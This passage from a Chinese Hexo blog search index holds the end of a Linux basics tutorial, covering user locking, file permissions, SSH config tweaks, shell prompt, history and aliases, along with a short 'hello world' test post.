class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">usermod</span> -L test1           <span class="hljs-comment"># 锁定用户，禁止登录</span><br>usermod -U test1           <span class="hljs-comment"># 解锁用户</span><br></code></pre></td></tr></table></figure><h4 id="查看用户信息-1"><a href="#查看用户信息-1" class="headerlink" title="查看用户信息"></a>查看用户信息</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">chage</span> -l test1             <span class="hljs-comment"># 查看用户密码和过期策略</span><br></code></pre></td></tr></table></figure><hr><h2 id="七、权限管理"><a href="#七、权限管理" class="headerlink" title="七、权限管理"></a>七、权限管理</h2><h3 id="1-权限介绍和示例"><a href="#1-权限介绍和示例" class="headerlink" title="1. 权限介绍和示例"></a>1. 权限介绍和示例</h3><p>文件权限组成：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">-rw-r--r--.<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>7月<span class="hljs-number"> 20 </span>23:17 /tmp/123.txt<br><br></code></pre></td></tr></table></figure><h3 id="2-权限操作示例"><a href="#2-权限操作示例" class="headerlink" title="2. 权限操作示例"></a>2. 权限操作示例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> u+x test1.txt<br><span class="hljs-built_in">chmod</span> 777 test1.txt<br><br></code></pre></td></tr></table></figure><h3 id="3-文件属性详解"><a href="#3-文件属性详解" class="headerlink" title="3. 文件属性详解"></a>3. 文件属性详解</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l /tmp/123.txt<br><br></code></pre></td></tr></table></figure><hr><h2 id="八、Linux-Shell"><a href="#八、Linux-Shell" class="headerlink" title="八、Linux Shell"></a>八、Linux Shell</h2><h3 id="1-Shell-概念"><a href="#1-Shell-概念" class="headerlink" title="1. Shell 概念"></a>1. Shell 概念</h3><p>Shell 是用户与内核的交互界面。</p><h3 id="2-优化-SSH-登录速度"><a href="#2-优化-SSH-登录速度" class="headerlink" title="2. 优化 SSH 登录速度"></a>2. 优化 SSH 登录速度</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /etc/ssh/sshd_config /tmp/<br>vi /etc/ssh/sshd_config<br><span class="hljs-comment"># 添加：</span><br>GSSAPIAuthentication no<br>UseDNS no<br>systemctl restart sshd<br><br></code></pre></td></tr></table></figure><h3 id="3-Shell-提示符"><a href="#3-Shell-提示符" class="headerlink" title="3. Shell 提示符"></a>3. Shell 提示符</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">PS1</span>=<span class="hljs-string">&#x27;[\u@\h \w]\$ &#x27;</span><br><br></code></pre></td></tr></table></figure><h3 id="4-常用快捷键"><a href="#4-常用快捷键" class="headerlink" title="4. 常用快捷键"></a>4. 常用快捷键</h3><ul><li><code>Ctrl + A</code>：光标移至行首</li><li><code>Ctrl + E</code>：光标移至行尾</li><li><code>Ctrl + C</code>：终止前台进程</li><li><code>Ctrl + Z</code>：暂停并后台运行</li></ul><h3 id="5-历史命令（history）"><a href="#5-历史命令（history）" class="headerlink" title="5. 历史命令（history）"></a>5. 历史命令（history）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span>          <span class="hljs-comment"># 列出最近 1000 条（可在 $HISTSIZE 修改）</span><br><br></code></pre></td></tr></table></figure><h3 id="6-命令别名（alias）"><a href="#6-命令别名（alias）" class="headerlink" title="6. 命令别名（alias）"></a>6. 命令别名（alias）</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">alias</span> ll=&#x27;<span class="hljs-keyword">ls</span> -l <span class="hljs-params">--color=auto</span>&#x27;<br><span class="hljs-keyword">unalias</span> ll<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>系统基础</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>命令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hello-world</title>
    <link href="/2025/07/20/hello-world/"/>
    <url>/2025/07/20/hello-world/</url>
    
    <content type="html"><![CDATA[<p>🎉 欢迎来到我的博客！这是我的第一篇文章，用来测试 Hexo 是否成功部署啦～</p><div class="note note-note-primary">            <p>如果你看到这篇文章，说明博客已经启动成功啦！</p>          </div><p><img src="https://bae-ace.github.io/img/exanple.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
      <category>初始测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>博客搭建</tag>
      
      <tag>初始测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
